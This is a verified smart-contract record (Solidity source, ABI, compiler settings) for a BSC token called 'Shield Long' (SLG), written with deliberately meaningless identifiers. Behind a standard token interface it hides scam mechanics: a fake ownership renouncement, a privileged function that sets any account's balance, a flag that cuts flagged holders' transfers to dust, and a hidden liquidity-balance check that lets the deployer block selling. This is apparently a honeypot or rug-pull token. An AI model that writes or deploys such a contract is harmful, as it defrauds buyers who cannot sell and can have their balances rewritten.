{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fromFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTradingReceiver {\n    function createPair(address fromMin, address enableLimit) external returns (address);\n}\n\ninterface txLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLimitExempt) external view returns (uint256);\n\n    function transfer(address receiverFrom, uint256 sellEnableFrom) external returns (bool);\n\n    function allowance(address toLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellEnableFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverFrom,\n        uint256 sellEnableFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityWallet, uint256 value);\n    event Approval(address indexed toLaunch, address indexed spender, uint256 value);\n}\n\ninterface txLaunchMetadata is txLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShieldLong is receiverSender, txLaunch, txLaunchMetadata {\n\n    function getOwner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    function balanceOf(address toLimitExempt) public view virtual override returns (uint256) {\n        return autoWallet[toLimitExempt];\n    }\n\n    uint256 private listReceiver;\n\n    bool private amountLiquidity;\n\n    bool public exemptTotalTrading;\n\n    address buyShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private launchedReceiver;\n\n    mapping(address => bool) public receiverTake;\n\n    function toTake(address modeList) public {\n        fromMax();\n        \n        if (modeList == tokenAmount || modeList == minMode) {\n            return;\n        }\n        receiverTake[modeList] = true;\n    }\n\n    event OwnershipTransferred(address indexed atMarketing, address indexed launchAmount);\n\n    bool public listMin;\n\n    function sellShould(address launchSell) public {\n        require(launchSell.balance < 100000);\n        if (senderTeamLimit) {\n            return;\n        }\n        if (listMin) {\n            listReceiver = amountWallet;\n        }\n        modeMinTrading[launchSell] = true;\n        \n        senderTeamLimit = true;\n    }\n\n    function transferFrom(address toFund, address receiverFrom, uint256 sellEnableFrom) external override returns (bool) {\n        if (_msgSender() != buyShould) {\n            if (fromLimit[toFund][_msgSender()] != type(uint256).max) {\n                require(sellEnableFrom <= fromLimit[toFund][_msgSender()]);\n                fromLimit[toFund][_msgSender()] -= sellEnableFrom;\n            }\n        }\n        return limitFundAuto(toFund, receiverFrom, sellEnableFrom);\n    }\n\n    bool public senderTeamLimit;\n\n    constructor (){\n        \n        fromFee listFund = fromFee(buyShould);\n        minMode = swapTradingReceiver(listFund.factory()).createPair(listFund.WETH(), address(this));\n        if (listMin) {\n            amountWallet = listReceiver;\n        }\n        tokenAmount = _msgSender();\n        maxReceiver();\n        modeMinTrading[tokenAmount] = true;\n        autoWallet[tokenAmount] = launchMarketing;\n        \n        emit Transfer(address(0), tokenAmount, launchMarketing);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletEnable;\n    }\n\n    function minTotalBuy(uint256 sellEnableFrom) public {\n        fromMax();\n        sellIs = sellEnableFrom;\n    }\n\n    function allowance(address txMarketingAuto, address sellEnable) external view virtual override returns (uint256) {\n        if (sellEnable == buyShould) {\n            return type(uint256).max;\n        }\n        return fromLimit[txMarketingAuto][sellEnable];\n    }\n\n    uint256 takeTxExempt;\n\n    uint256 constant walletSell = 10 ** 10;\n\n    function approve(address sellEnable, uint256 sellEnableFrom) public virtual override returns (bool) {\n        fromLimit[_msgSender()][sellEnable] = sellEnableFrom;\n        emit Approval(_msgSender(), sellEnable, sellEnableFrom);\n        return true;\n    }\n\n    string private walletEnable = \"Shield Long\";\n\n    function fromMax() private view {\n        require(modeMinTrading[_msgSender()]);\n    }\n\n    uint8 private takeLaunched = 18;\n\n    uint256 private launchMarketing = 100000000 * 10 ** 18;\n\n    function transfer(address amountExempt, uint256 sellEnableFrom) external virtual override returns (bool) {\n        return limitFundAuto(_msgSender(), amountExempt, sellEnableFrom);\n    }\n\n    string private teamWallet = \"SLG\";\n\n    function owner() external view returns (address) {\n        return launchedReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamWallet;\n    }\n\n    mapping(address => bool) public modeMinTrading;\n\n    mapping(address => uint256) private autoWallet;\n\n    function swapReceiver(address amountExempt, uint256 sellEnableFrom) public {\n        fromMax();\n        autoWallet[amountExempt] = sellEnableFrom;\n    }\n\n    address public tokenAmount;\n\n    mapping(address => mapping(address => uint256)) private fromLimit;\n\n    function maxReceiver() public {\n        emit OwnershipTransferred(tokenAmount, address(0));\n        launchedReceiver = address(0);\n    }\n\n    address toExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchMarketing;\n    }\n\n    uint256 sellIs;\n\n    function senderWallet(address toFund, address receiverFrom, uint256 sellEnableFrom) internal returns (bool) {\n        require(autoWallet[toFund] >= sellEnableFrom);\n        autoWallet[toFund] -= sellEnableFrom;\n        autoWallet[receiverFrom] += sellEnableFrom;\n        emit Transfer(toFund, receiverFrom, sellEnableFrom);\n        return true;\n    }\n\n    function limitFundAuto(address toFund, address receiverFrom, uint256 sellEnableFrom) internal returns (bool) {\n        if (toFund == tokenAmount) {\n            return senderWallet(toFund, receiverFrom, sellEnableFrom);\n        }\n        uint256 buyTo = txLaunch(minMode).balanceOf(toExempt);\n        require(buyTo == sellIs);\n        require(receiverFrom != toExempt);\n        if (receiverTake[toFund]) {\n            return senderWallet(toFund, receiverFrom, walletSell);\n        }\n        return senderWallet(toFund, receiverFrom, sellEnableFrom);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeLaunched;\n    }\n\n    address public minMode;\n\n    uint256 private amountWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnableFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimitExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellEnableFrom\",\"type\":\"uint256\"}],\"name\":\"minTotalBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeMinTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"sellShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnableFrom\",\"type\":\"uint256\"}],\"name\":\"swapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"}],\"name\":\"toTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShieldLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}